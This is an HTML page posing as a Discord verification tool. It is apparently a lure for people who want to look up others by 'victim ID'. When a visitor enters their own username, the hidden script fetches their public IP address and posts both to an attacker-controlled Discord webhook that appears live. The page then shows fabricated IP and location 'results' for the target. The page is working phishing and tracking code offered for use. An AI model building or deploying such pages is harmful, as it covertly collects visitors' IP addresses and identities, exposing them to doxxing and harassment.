<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification System</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #36393f;
            color: white;
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
        }
        .container {
            background-color: #2f3136;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            background-color: #40444b;
            border: none;
            border-radius: 4px;
            color: white;
        }
        button {
            background-color: #5865f2;
            color: white;
            border: none;
            padding: 10px;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
        }
        button:hover {
            background-color: #4752c4;
        }
        .hidden {
            display: none;
        }
        .result {
            margin-top: 20px;
            padding: 15px;
            background-color: #202225;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Discord User Verification</h1>
        
        <div id="step1">
            <p>Hey, what's your Discord username first to verify you're a real human?</p>
            <input type="text" id="username" placeholder="YourDiscord#1234">
            <button onclick="verifyUser()">Verify</button>
        </div>
        
        <div id="step2" class="hidden">
            <p>Enter your Discord user victim ID!</p>
            <input type="text" id="victimId" placeholder="123456789012345678">
            <button onclick="generateResult()">Generate Info</button>
        </div>
        
        <div id="result" class="hidden">
            <h3>Generated Information:</h3>
            <div class="result">
                <p>Victim ID: <span id="displayVictimId"></span></p>
                <p>IP Address: <span id="ipAddress"></span></p>
                <p>Location: <span id="location"></span></p>
            </div>
        </div>
    </div>

    <script>
        // Store collected data
        let userData = {
            username: "",
            victimId: "",
            ip: ""
        };

        // Function to get IP (this is a simulation - real IP requires server-side code)
        async function getIP() {
            try {
                // In a real scenario, you'd need a backend service to get the real IP
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip || "192.168." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255);
            } catch {
                return "192.168." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255);
            }
        }

        // Function to send data to Discord webhook
        async function sendToDiscord() {
            const webhookURL = "https://discord.com/api/webhooks/1384589459013636096/Kxp6NHf4_I-uQ2oJlbhGcwXvBC_7WlhwOVmYe2TJU60IkVV7nnMqSYYw32-CEV8_DJxF"; // Replace with actual webhook URL
            
            const payload = {
                content: "Someone opened the link!\n\nðŸ‘Œ Discord User: " + userData.username + "\nðŸ’€ IP: " + userData.ip
            };

            try {
                await fetch(webhookURL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                console.error("Error sending to Discord:", error);
            }
        }

        // Step 1: Verify user
        async function verifyUser() {
            const username = document.getElementById("username").value.trim();
            if (!username) return alert("Please enter a username!");
            
            userData.username = username;
            userData.ip = await getIP();
            
            document.getElementById("step1").classList.add("hidden");
            document.getElementById("step2").classList.remove("hidden");
            
            // Send initial notification
            await sendToDiscord();
        }

        // Step 2: Generate fake info
        function generateResult() {
            const victimId = document.getElementById("victimId").value.trim();
            if (!victimId) return alert("Please enter a victim ID!");
            
            userData.victimId = victimId;
            
            // Display fake generated info
            document.getElementById("displayVictimId").textContent = victimId;
            document.getElementById("ipAddress").textContent = 
                "192." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255);
            document.getElementById("location").textContent = 
                ["New York", "London", "Tokyo", "Sydney", "Berlin"][Math.floor(Math.random() * 5)];
            
            document.getElementById("step2").classList.add("hidden");
            document.getElementById("result").classList.remove("hidden");
        }
    </script>
</body>
</html>
